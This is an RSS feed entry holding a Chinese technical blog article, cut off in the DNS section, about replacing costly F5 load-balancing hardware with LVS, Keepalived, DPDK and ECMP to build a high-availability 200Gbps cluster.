<?xml version="1.0" encoding="UTF-8"?>
        <rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/">
            <channel>
            <title>开发者头条</title>
            <link>http://toutiao.io/</link>
            <description></description>
<item>
<guid>d5c186ea33f5dec05a19afdedaa2153f</guid>
<title>使用 SDN 技术替代价值百万人民币的负载均衡硬件（网关、LVS、交换机）</title>
<link>https://toutiao.io/k/v4yc231</link>
<content:encoded>&lt;div&gt;&lt;div&gt;&lt;div class=&quot;rich_media_content js_underline_content             autoTypeSetting24psection&amp;#10;            &quot; id=&quot;js_content&quot;&gt;&lt;p&gt;&lt;span&gt;本文共 11000 字，阅读大约需要 40 分钟。&lt;/span&gt;&lt;/p&gt;&lt;hr/&gt;&lt;section&gt;上一篇文章的末尾，我们利用负载均衡器打造了一个五万 QPS 的系统，本篇文章我们就来了解一下负载均衡技术的发展历程，并一起用 SDN（软件定义网络）技术打造出一个能够抗住 200Gbps 的负载均衡集群。&lt;/section&gt;&lt;h2&gt;负载均衡发展史&lt;/h2&gt;&lt;h3&gt;F5 创业史&lt;/h3&gt;&lt;p&gt;1996 年，华盛顿大学的几个学生共同创建了一家生产负载均衡设备的公司，并用美国人民的老朋友——飓风的最高等级 F5 作为品牌名，以表示他们的设备可以抗住最狂暴的网络流量。彼时，互联网的规模每 100 天增长一倍，这也让 F5 在成立三年后火速上市。2001 年，F5 公司在经历了互联网泡沫后，顺利地把设备卖进了银行等大型机构，因为 F5 比微软和甲骨文都更有前瞻性：他们的 iControl 系统可以提供 API，让大型机构自己开发软件来控制通过负载均衡设备的所有流量。&lt;/p&gt;&lt;p&gt;早在 2001 年，软件的威力就已经开始展现。&lt;/p&gt;&lt;h4&gt;TMOS 软件平台&lt;/h4&gt;&lt;p&gt;&lt;span&gt;2003 年非典&lt;/span&gt;暴&lt;span&gt;发，电子商务，网络点餐甚至是网络新闻都迎来了爆发式的增长。&lt;/span&gt;&lt;span&gt;2004 年，F5 上市了新一代产品：&lt;/span&gt;&lt;span&gt;包含 TMOS 软件平台的全套硬件设备，一次性解决了网络访问、数据中心同步访问、远程办公、应用防火墙等多种需求。&lt;/span&gt;&lt;span&gt;此后，市场上 F5 公司的产品越来越具有统治力。&lt;/span&gt;&lt;/p&gt;&lt;h4&gt;迈向应用交付&lt;/h4&gt;&lt;p&gt;2006 年以后，传统的 IP 层负载均衡技术开始向应用层发展，F5 等相关设备厂商也紧跟潮流开始推广“应用交付”的概念，开发了很多结合了负载均衡和应用网关的产品，这之后的十年，是传统负载均衡硬件厂商的最后荣光。&lt;/p&gt;&lt;p&gt;2019 年，F5 Networks 以 6.7 亿美金的价格收购了 Nginx，硬件厂商和软件厂商实现了一次梦幻联动，也侧面说明了我们确实已经迎来了软件定义网络的大时代。&lt;/p&gt;&lt;h4&gt;顺便提一句防火墙&lt;/h4&gt;&lt;p&gt;实际上，在今天的企业网络架构中，专业的网关设备都已经消失，取而代之的是一个看起来不是网络设备的网络设备：防火墙。特别是具备应用识别能力的“下一代防火墙”（没错，就是这个中二的名字），更是将防火墙设备的价值推上了巅峰，并一次性让企业级路由器和中低端负载均衡全部退场，这又是一个软件战胜硬件的故事。&lt;/p&gt;&lt;blockquote&gt;&lt;p&gt;一个小八卦，下一代防火墙行业的个中翘楚 Fortinet 公司，由两名出生于北京的清华大学老师的孩子 2000 年在美国创办。&lt;/p&gt;&lt;/blockquote&gt;&lt;h3&gt;负载均衡一代目：硬件负载均衡&lt;/h3&gt;&lt;p&gt;&lt;span&gt;2002 年 2 月，戴尔为 PowerEdge 1650 服务器第一次配上了千兆以太网。当时，负载均衡的主流实现还是基于硬件的，或者说是基于“软硬件一体化解决方案”的。在当时，服务器 CPU 的单核性能还很低，甚至核心数都很少，网卡芯片技术也没有今天这般牛皮（相比于下面&lt;/span&gt;讲&lt;span&gt;的 NPU），所以当时想用运行在标准操作系统(Windows/Linux)内的软件来实现千兆软网关还是一个“前沿探索项目”。&lt;/span&gt;&lt;span&gt;更不要说万兆负载均衡了：&lt;/span&gt;&lt;span&gt;PowerEdge 1650 发布&lt;/span&gt;的&lt;span&gt;四个月后，万兆以太网的标准“IEEE 802.3ae 10 Gb/s 光纤以太网”才首次发布，距离万兆网卡在服务器端普及更是还有十多年的光景。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;不为人知的是，千兆以太网的光纤标准 1998 年才发布，千兆以太网的双绞线标准 1999 年才发布，而到了 2002 年，万兆以太网光纤标准就已经发布了。实际上，千兆以太网在消费端开始普及，也已经是 2010 年的事情了。&lt;/p&gt;&lt;p&gt;21 世纪的头十年，最优秀的超千兆解决方案是：利用二层网络的链路聚合协议，使用多个千兆口同时负载均衡，实现超千兆的速度。而且当时能做到数 G 带宽的负载均衡设备动辄上百万，价格惊人，有需求的终端客户简直就是大冤种，不过在那个移动通信基站都要完全进口的年代，哪个中国人不是大冤种呢。&lt;/p&gt;&lt;p&gt;这些网络硬件厂商，其实都是软件厂商，只不过他们选择将自己的软件装在这些黑色的铁盒子里面卖，这样的产品质量更稳定，更重要的是：这样更贵。相比于买一个看起来可以随意拷贝盗版又虚无缥缈的软件，人类社会落后的官僚体系也更容易接受购买昂贵的实物。具体的技术分析请往下看。&lt;/p&gt;&lt;h3&gt;负载均衡二代目：软件负载均衡&lt;/h3&gt;&lt;p&gt;最近十年，随着云计算的兴起，从硬件设备到 IT 基础设施都发生了翻天覆地的变化，现在，硬件负载均衡已经开始逐步退场：云服务商们使用软件定义网络（SDN）技术，构建出了一个低成本高性能的新世界。&lt;/p&gt;&lt;p&gt;今天，一台总价 3 万元的通用 X86 服务器搭配 100G 以太网卡，使用基于 DPDK 开发的用户态应用程序在 Linux 上发小包，很容易就可以跑满 100Gbps 的网卡带宽¹。&lt;/p&gt;&lt;p&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;1.0822784810126582&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_jpg/qehPQXlzsA2dFWZAhfzT9Hvdg53dx3CNM7nMMu1Aib6AJLtUdEVZyWssZwuvHvAA4ldpZuxHPKQ3BzBv0tnCdvQ/640?wx_fmt=jpeg&quot; data-type=&quot;jpeg&quot; data-w=&quot;632&quot;/&gt;&lt;/p&gt;&lt;p&gt;这个 tweet 也许有些夸张，但是这就是我们当下的世界：软件正在定义网络的一切。&lt;/p&gt;&lt;h3&gt;价值百万的硬件设备&lt;/h3&gt;&lt;p&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.17342342342342343&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_jpg/qehPQXlzsA2dFWZAhfzT9Hvdg53dx3CNnDG9QJVDxxU57FGaTwWWq0NdH8vUeqTiaw73vpEAPu1w8qmaAbk2EtA/640?wx_fmt=jpeg&quot; data-type=&quot;jpeg&quot; data-w=&quot;1776&quot;/&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.7074030552291422&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_jpg/qehPQXlzsA2dFWZAhfzT9Hvdg53dx3CNjastvibYtGaGicAcy4olbTHaOL4nXppSLs6NBDXNHVdDw3BnhlpUGG7Q/640?wx_fmt=jpeg&quot; data-type=&quot;jpeg&quot; data-w=&quot;1702&quot;/&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;这是一台 F5 生产的售价百万的硬件负载均衡设备，它只用了一颗 4 &lt;/span&gt;核&lt;span&gt; 8 线程的志强 x86 CPU，就实现了 40G 的四层负载均衡能力和 18G 的七层负载均衡（应用网关）能力。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;这台设备内部有两个控制器和四个接口插槽，可以实现“全双活”，即控制流量的“CPU 内存主板”和“网络接口”都是双份，在任意一个资源意外宕机后，另一个备用资源可以无缝顶上，可以实现无丢包的硬件级高可用。同时，这台设备背后的电源适配器应该至少有四个，可以实现运行时热替换，甚至连风扇模组都是冗余的，可热替换的。&lt;/p&gt;&lt;p&gt;下面我们正式开始利用软件的力量，一步一步在标准 x86 服务器上面跑的标准 Linux 系统内，构建出一个和这台硬件负载均衡设备高可用性一致，且带宽可以达到 200G 的负载均衡集群。&lt;/p&gt;&lt;p&gt;让我们先从交换机技术开始讲起。&lt;/p&gt;&lt;h2&gt;交换机&lt;/h2&gt;&lt;p&gt;大家还记得上一篇文章中的负载均衡架构图吗：&lt;/p&gt;&lt;p&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.8775252525252525&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_jpg/qehPQXlzsA2dFWZAhfzT9Hvdg53dx3CNhJUroSyg5Q4nhQH6jgD0KEhhtud9NCLXMlH6yR9cSJIM2FNatfH5nA/640?wx_fmt=jpeg&quot; data-type=&quot;jpeg&quot; data-w=&quot;1584&quot;/&gt;&lt;/p&gt;&lt;p&gt;这张图里就暗藏了一个交换机。&lt;/p&gt;&lt;p&gt;左侧，客户端和负载均衡器之间是使用公网 ip 通信的，他们俩是在全球互联网内的两台对等设备，只是数据包经过了很多个真·路由器的“路由”操作，双方才能收到对方发送的数据包。&lt;/p&gt;&lt;p&gt;右侧，负载均衡器和上游服务器通信的时候采用的是内网 ip：&lt;code&gt;10.0.0.100&lt;/code&gt; 和 &lt;code&gt;10.0.0.1&lt;/code&gt;，他们俩是怎么通信的呢？通过交换机。&lt;/p&gt;&lt;h3&gt;路由器和交换机巨大的价格落差&lt;/h3&gt;&lt;p&gt;一台能够跑满千兆 NAT 的路由器，最低价格大概在 300 块，但是一个所有口都能同时跑满全双工千兆（上下行同时跑满千兆）的五口交换机，你知道多少钱吗？39 块钱，包邮。&lt;/p&gt;&lt;p&gt;为什么呢？因为交换机干的事情更为简单，可以用非常低端的芯片满足需求。&lt;/p&gt;&lt;h3&gt;交换机的工作原理&lt;/h3&gt;&lt;p&gt;网关是通过关联两个五元组，再对数据进行修改而发挥作用的。交换机则更简单：只维护一个 MAC 地址在哪个网口上的 HASH 表即可，无需对数据进行任何修改。该表的 key 为 48 位长，value 是个 tinyint：4 口交换机可用 2 bit 表示，8 口交换机可用 3 bit 表示，现在知道为什么家用交换机都是 8 口的了吧。&lt;/p&gt;&lt;p&gt;交换机的工作模式简单表述如下：&lt;/p&gt;&lt;ol class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;p&gt;当交换机收到一个 MAC 包时，会查询目的 MAC 地址在哪个网口上&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;若查询不到，交换机会把这个 MAC 包发送到所有口上，包含发来数据包的那个口&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;等到这个 MAC 包被响应，这个 MAC 地址和口的关系就被交换机学习到了，下次就不需要发给所有口了&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;若查询到了，则单独发送到目标网口上&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;全程不会对数据包进行任何修改&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;除了不需要修改数据包之外，交换机也不需要和任何设备通信来建立和更新 MAC 表，只需要监听途径交换机的所有数据包的源 MAC 地址即可。&lt;/p&gt;&lt;h3&gt;交换机技术的优缺点&lt;/h3&gt;&lt;p&gt;优点&lt;/p&gt;&lt;ol class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;p&gt;足够简单，所以硬件成本可以做到足够低&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;不需要和任何设备通信即可支持新设备接入，完全自学习&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;扩展性无敌，交换机可以随便级联，只要 MAC 表容量够，理论上可以插成一颗无限层级的树&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;缺点&lt;/p&gt;&lt;ol class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;p&gt;有网络风暴的风险：数据包被无脑的发到所有口，可能会被别的交换机再发回来，到时候你来我往，跑满线速，造成正常数据包的拥堵&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;网络回环非常恐怖：如果把交换机的两个口用一根线插在一起，那这台交换机会瞬间断网，左右互搏之术对交换机这种低层级设备来说过于困难了&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;当然，现在主流的商用二层交换机已经拥有了很多的三层特性，这些缺点通过各种检测技术都已经解决了。&lt;/p&gt;&lt;h4&gt;大家不要觉得交换机原理没什么用，SDN 是一种跨越了一二三层的技术，MAC 层也是我们构建 200G 负载均衡集群的重要技术战场&lt;/h4&gt;&lt;p&gt;准备工作做完了，下面我们开始搭建负载均衡集群。先从这一切的基础—— LVS 开源软件说起。&lt;/p&gt;&lt;h2&gt;LVS 登场&lt;/h2&gt;&lt;h3&gt;章文嵩创建 IPVS&lt;/h3&gt;&lt;p&gt;1998 年，在章文嵩博士二年级的时候，他发现 Cisco 的硬件负载均衡器要卖几万美金，觉得这玩意儿不难写，于是利用两周的课余时间创建并开源了 LVS（当时叫 IPVS）。时至今日，LVS 技术创造的商业价值已经无法计算，互联网上的绝大部分数据包，都会被 LVS 或者承袭 LVS 思想的软件处理。&lt;/p&gt;&lt;h3&gt;合并进 Linux kernel&lt;/h3&gt;&lt;p&gt;2004 年，LVS（IPVS）被合并进了 kernel 2.4，从此开始，所有 Linux 都拥有了变身为负载均衡器的能力。&lt;/p&gt;&lt;h3&gt;LVS 基本原理&lt;/h3&gt;&lt;p&gt;其实一句话就能说清：通过修改 MAC 层、IP 层、TCP 层的数据包，即实现了一部分交换机和网关的功能，指挥流量到达真正的服务器上。&lt;/p&gt;&lt;p&gt;LVS 有三个常用模式：&lt;/p&gt;&lt;ol class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;p&gt;NAT 模式：即网关模式，双向流量均经过网关转发，性能开销最大&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;TUN 模式：类似于单臂路由，性能高且可跨越机房&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;DR 模式：只能用在局域网，但是性能惊人，因为回程流量直接走局域网&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;我们以最能体现 LVS 思想的 DR 模式为例，展示 LVS 的基本原理。&lt;/p&gt;&lt;h3&gt;DR 模式架构图&lt;/h3&gt;&lt;p&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.6046758767268863&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_jpg/qehPQXlzsA2dFWZAhfzT9Hvdg53dx3CNMicLIKf9icjfeEcPibvuBLfIBqPib09Bxs2FnFIbxDAbV6P4KIqtHBYNEw/640?wx_fmt=jpeg&quot; data-type=&quot;jpeg&quot; data-w=&quot;1882&quot;/&gt;&lt;/p&gt;&lt;h3&gt;DR 模式数据包推演&lt;/h3&gt;&lt;p&gt;DR 模式下，LVS 只负责篡改数据包，不负责充当网关，所以我们还是需要一个网关在公网 ip 和私网 ip 之间进行 NAT 转换。我们依然假设客户端 ip 为 123.123.123.123，它发起了一个针对 110.242.68.3 的 80 端口的 HTTP 请求。&lt;/p&gt;&lt;p&gt;当网关接收到一个发送给 110.242.68.3 的数据包时，发现协议为 TCP，目标端口为 80，查询自己的 NAT 表发现内部 ip 为 10.0.0.100（VIP，即虚拟ip），内部端口为 80，于是网关向局域网发出了一个 ip 包。由于端口都是 80 不变，协议都是 TCP 不变，所以本次网络请求中，有四个数据非常关键：源 ip 地址，目的 ip 地址，源 MAC 地址，目的 MAC 地址。&lt;/p&gt;&lt;ol class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;p&gt;客户端发给网关的数据包情况为：&lt;/p&gt;&lt;/li&gt;&lt;ol class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;p&gt;源 ip：123.123.123.123&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;目的 ip：110.242.68.3&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;源 MAC：客户端 MAC&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;目的 MAC：网关 MAC&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;li&gt;&lt;p&gt;网关向局域网发出的数据包情况为：&lt;/p&gt;&lt;/li&gt;&lt;ol class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;p&gt;源 ip：123.123.123.123&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;目的 ip：10.0.0.100（变了）&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;源 MAC：网关 MAC（变了）&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;目的 MAC：LVS MAC（变了）&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;li&gt;&lt;p&gt;LVS 接到该数据包后，会选择一个后端服务器，假设它选中的是 10.0.0.1 来真正处理请求，则 LVS 会对数据包进行如下修改后，再发送给 10.0.0.1：&lt;/p&gt;&lt;/li&gt;&lt;ol class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;p&gt;源 ip：123.123.123.123&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;目的 ip：10.0.0.100&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;源 MAC：LVS MAC（变了）&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;目的 MAC：10.0.0.1 的 MAC（变了）&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;li&gt;&lt;p&gt;10.0.0.1 在收到该数据包后，发现这个包的目的 MAC 地址确实是自己，而且目的 ip 10.0.0.100（VIP）也是自己，于是对该数据包进行正常的处理，然后将处理结果发送出去：&lt;/p&gt;&lt;/li&gt;&lt;ol class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;p&gt;源 ip：10.0.0.100&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;目的 ip：123.123.123.123&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;源 MAC：10.0.0.1 的 MAC&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;目的 MAC：网关 MAC（因为目的 ip 不在“ip+子网掩码”所确定的局域网范围内，所以该数据包会被发送给网关）&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;li&gt;&lt;p&gt;网关收到返回的数据包后，通过查询“五元组关系表”，对端口和 ip 信息做出正常的 NAT 修改后，将数据包发送回 123.123.123.123，请求结束。&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;大家可以看出 DR 模式的特点：&lt;/p&gt;&lt;ol class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;p&gt;LVS 只需要处理正向数据包，通常正向数据包（请求）要远小于反向数据包（响应），所以带宽占用较低&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;反向数据包走的是标准的二层以太网，每台上游服务器都可以跑满自己的线速&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;只能在同一个二层网络下工作（即同一个局域网），且安全性较差&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;需要在每一台上游服务器上都将该 VIP（10.0.0.100）配置为 lo（本地回环）接口的 ip&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;需要让每一台上游服务器都只响应真实 ip 如 10.0.0.1 的 ARP 查询请求，如果一不小心回复了针对 VIP 的 ARP 请求，将会立刻天下大乱：局域网内有多台机器同时声称自己拥有 10.0.0.100 这个 ip，交换机直接疯掉&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;在生产环境部署中，由于 LVS 集群是所有流量的入口，所以其可用性需要做到非常高，一般不会只部署在一个机房里，所以现实中最常用的是 NAT 模式：双向流量均经过 LVS 集群，这样便可以实现多地多中心的跨公网多活。&lt;/p&gt;&lt;h3&gt;LVS 设计思想&lt;/h3&gt;&lt;p&gt;通过上面的过程，你应该能看出来 LVS 的运行原理了：它通过在 LVS 和上游服务器上配置&lt;code&gt;虚拟 ip&lt;/code&gt;，以&lt;code&gt;对数据包进行篡改后再发送&lt;/code&gt;为手段，在标准以太网模型下构建出了一个可行的负载均衡系统。它不像交换机那样完全不修改数据包，也不像网关那样维持一个对应关系并修改很多东西，它篡改了数据包，但不多，所以可以实现非常高的性能。&lt;/p&gt;&lt;h4&gt;内核态&lt;/h4&gt;&lt;p&gt;LVS 的数据处理组件 IPVS 运行在内核态，避免了用户态的进程切换开销，再配合低负载的 DR 模式，可以进一步提升性能。&lt;/p&gt;&lt;p&gt;由于有内核态加持，LVS 比 HAProxy 和 Nginx 的单机性能都要强很多。&lt;/p&gt;&lt;h3&gt;专业的负载均衡协议：OSPF/ECMP&lt;/h3&gt;&lt;p&gt;OSPF：开放式最短路径优先协议，一种基于链路状态的内部网关协议。每个OSPF路由器都包含了整个网络的拓扑。并计算通过网络的最短路径。OSPF会通过多播的方式自动对外传播检测到的网络变化。&lt;/p&gt;&lt;p&gt;ECMP：等价多路径协议。即当存在多条不同的链路到达同一目的地址时，利用ECMP可以同时使用多条链路，不仅增加了传输带宽，还可以无时延、无丢包的备份失效链路的数据传输。如果利用传统的路由算法，只能利用其中的一条链路进行数据的传输。&lt;/p&gt;&lt;p&gt;LVS 是运行在标准以太网模型下的负载均衡软件，配合 Keepalived 可以实现高可用。而 ECMP 协议是专业的多链路路由协议，可以实现不丢包的多活，我们下面还会用到。&lt;/p&gt;&lt;h4&gt;LVS 将网关这个单点拆成了“定向”和“转发”&lt;/h4&gt;&lt;p&gt;LVS 就是网关型负载均衡继续拆单点的结果：LVS 自己只承担数据包重定向工作，将转发留给基础网以太网来解决，在单机上实现了非常高的系统容量。在最新的服务器硬件上，单个 LVS 即便在开销更大的 NAT 模式下也可以实现大约 20G 的 TCP 带宽²。&lt;/p&gt;&lt;h2&gt;Keepalived 高可用&lt;/h2&gt;&lt;p&gt;LVS 单机 20G 的带宽显然和我们 200G 的目标还相去甚远，但是我们接下来要做的第一件事并不是提升系统容量，而是先提升系统的稳定性：搭建高可用架构。&lt;/p&gt;&lt;p&gt;Keepalived 是一个非常优秀的搭建高可用集群的开源软件，它最开始就是为了和 LVS 配合而出现的，主要的作用是构建一个自选举集群。它支持 3 台控制器集群独立部署，也支持部署到应用机器上。它和 LVS 一样基于虚拟 ip 技术，可以在任意标准以太网内运行。&lt;/p&gt;&lt;h3&gt;Keepalived 运行原理&lt;/h3&gt;&lt;p&gt;Keepalived 运行原理说起来其实非常简单：&lt;/p&gt;&lt;ol class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;p&gt;两台机器上都配置同一个虚拟 ip（VIP）：即两台机器的真实 ip 分别是 10.0.0.101 和 10.0.0.102，但是虚拟出一个 ip 10.0.0.100，这个 ip 不属于任何物理设备，可以在两台机器之间任意切换绑定&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;两台机器频繁通信，通过分数计算确定哪台机器的分数更高，由这台机器向局域网发送 VRRP 组播报文宣称 VIP 在我这里&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;当分数高的那台机器宕机，或者断网，或者检测到服务进程消失（例如 Nginx 挂掉），分数低的那台机器会在极短时间内立刻顶上，宣称 VIP 在自己这里&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;发送给 VIP 的数据包会在短时间失效之后由新机器承接（实测中断时间小于 1 秒），实现集群高可用&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;h4&gt;高可用 LVS 集群&lt;/h4&gt;&lt;p&gt;LVS 和 Keepalived 配合，基于多台物理机，可以实现一个高可用的负载均衡集群，架构图如下：&lt;/p&gt;&lt;p&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.502532928064843&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_jpg/qehPQXlzsA2dFWZAhfzT9Hvdg53dx3CNKmltic1Peqicgia0csxjVx7iaPsC6xNQOmT4eqsxxgjiaE1TCScsmf2L7ibg/640?wx_fmt=jpeg&quot; data-type=&quot;jpeg&quot; data-w=&quot;1974&quot;/&gt;&lt;/p&gt;&lt;p&gt;如果 Master 因为任何原因失效（硬件故障，机房断电，人为误操作，光缆挖断，火灾地震），Standby 机器就会迅速顶上，接管流量，实现高可用的目的。&lt;/p&gt;&lt;p&gt;金融级项目可以在一个城市跨三个机房做三节点的 Keepalived 集群。为什么不做多城市集群？因为多城市已经属于“两地三中心”的高可用技术领域，一般不在二层网络上做，跨城市专用光纤的建设费用是非常高的，城市内拉光纤就便宜多了。我们最后一篇文章会讲终极高可用架构。&lt;/p&gt;&lt;h3&gt;Keepalived 也可以用在其他组件上实现高可用&lt;/h3&gt;&lt;p&gt;我司办公区自建机房内也部署了一些非关键业务，其性能要求并不高，所以我选择单独部署 Keepalived：和 Kong 网关配合提供高可用网关；和 MySQL 配合做双主双活集群；和 Apache 配合做一个跨越 4 台物理机的虚拟机集群，提供高可用 HTTP 服务；等等其它案例不再赘述。&lt;/p&gt;&lt;h2&gt;从 20G 到 200G&lt;/h2&gt;&lt;p&gt;有了 Keepalived，我们就有了集群高可用的基础，下面我们开始啃硬骨头：从 20G 到 200G。&lt;/p&gt;&lt;h3&gt;LVS 单机性能为何会卡在 20G&lt;/h3&gt;&lt;p&gt;最新的 AMD EPYC 9654 服务器 CPU 有 96 个物理核心，双路平台共有 384 个 vCore，但是 LVS 单机性能依旧徘徊在 20G 附近，为何性能无法继续提升呢？因为 Linux 网络栈已经达到性能极限了。&lt;/p&gt;&lt;h3&gt;Linux 网络栈优化&lt;/h3&gt;&lt;p&gt;由于 LVS 基于 kernel 里的 netfilter，依赖 Linux 网络栈，导致进程切换需要读写内存，数据包的发送和接收也要读写内存，在极高的带宽需求之下，相对耗时的内存读写就成了阻碍性能进一步提升的最大障碍。DPDK 和 NPU 硬件卸载就是这个问题的两个解决方案。&lt;/p&gt;&lt;h4&gt;DPDK&lt;/h4&gt;&lt;p&gt;DPDK 是 Intel 开源的高性能网络数据处理框架，运行在用户态的进程通过申请大页内存和轮询代替中断两个关键特性，给高速率网卡提供了一个高性能解决方案。它的 CPU 亲和性、多核调度架构、内存 NUMA 优化等基础架构又进一步推高了性能，最终让它成功脱颖而出成为用户态网络界面框架的首选。&lt;/p&gt;&lt;p&gt;爱奇艺开源的 DPVS https://github.com/iqiyi/dpvs 就是 DPDK 技术在负载均衡领域的成功运用。在 10G 网络下发送 64 字节的小包进行测试，DPVS 可以做到标准 LVS 的五倍性能。在这里我们保守一点，对折一下 2.5 倍，那 DPVS 的单网卡性能极限就是 50G。&lt;/p&gt;&lt;h4&gt;网卡芯片硬件卸载&lt;/h4&gt;&lt;p&gt;最新的 NPU 已经可以支持很多的硬件卸载特性：IP 分片、TCP 分段、小包重组、checksum 校验、硬件 QOS，以及最重要的 VXLAN 的剥离和插入：此功能是 DPVS 的重要组成部分，可以减少数据流互相干扰，大幅提升系统总容量。&lt;/p&gt;&lt;p&gt;此外，RDMA 技术也是网卡芯片的一大进步方向，我们将会在后面讲数据库的计算和存储分离的时候详细了解。&lt;/p&gt;&lt;h3&gt;全局锁优化&lt;/h3&gt;&lt;p&gt;除了 Linux 网络栈的限制，LVS 本身架构上的全局锁也是一个突破口，全局锁导致了海量的 CPU 核心无法被利用，我们可以借鉴阿里云的处理思路：&lt;/p&gt;&lt;h4&gt;数据包亲和性优化&lt;/h4&gt;&lt;p&gt;阿里云通过 RSS 技术把同一个五源组报文扔到同一个 CPU 上处理，保证入方向的所有相同连接上的报文都能交给相同的 CPU 处理。同时在每个核在转发出去时都用当前 CPU 上的 Local 地址，通过设置一些 fdir 规则，报文回来时后端服务器访问的目的地址就是对应 CPU 上的 local 地址。这样就能实现这一条连接上面左右方向的报文都被同一个 CPU 处理，将存储“五元组对应关系”的内存数据库在不同的 CPU 核心上隔离开，这样就可以利用多个 VIP 来实现整体系统容量的线性提升³。&lt;/p&gt;&lt;h3&gt;性能问题还是要靠架构解决&lt;/h3&gt;&lt;p&gt;当单网卡性能极限来到了 50G，该怎么将集群性能提升到 200G 呢？插四块网卡行不行呢？理论上可行，但是现实中这么大的流量的系统一定要使用架构来提升系统容量，因为还需要解决高可用问题。&lt;/p&gt;&lt;p&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.9093023255813953&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_jpg/qehPQXlzsA2dFWZAhfzT9Hvdg53dx3CNicC1DrNpKKmJ82Ayysox4FVMIYkhof41GrwiajpVicWUQ3mvKRJ4q9pKQ/640?wx_fmt=jpeg&quot; data-type=&quot;jpeg&quot; data-w=&quot;1720&quot;/&gt;&lt;/p&gt;&lt;center&gt;200G 负载均衡集群架构图&lt;/center&gt;&lt;p&gt;下面我们从左到右对这个架构进行解析。&lt;/p&gt;&lt;h4&gt;1. 拆除 ip 单点：朴素的 DNS&lt;/h4&gt;&lt;p&gt;基于 DNS 技术做单域名多 ip 扩容曾是第一代负载均衡技术：朴素的 DNS 协议可以将用户的终端流量直接导向全国多个机房，实现真·性能倍增，这种技术特别适合 web 1.0 时代的静态网页，也适合搜索引擎等没有数据同步需求的服务。&lt;/p&gt;&lt;p&gt;在当年电信、网通、铁通、教育网之间只有 40G 小水管的年代，DNS 技术极大地提升了普通用户获取网络资源的速度，提升了用户体验：引导每个运营商的用户访问放在该运营商机房的服务器，可以实现“手搓 CDN 架构”。最后一篇文章我们还会谈到 DNS 技术在终极高可用架构中的价值。&lt;/p&gt;&lt;p&gt;经过 DNS 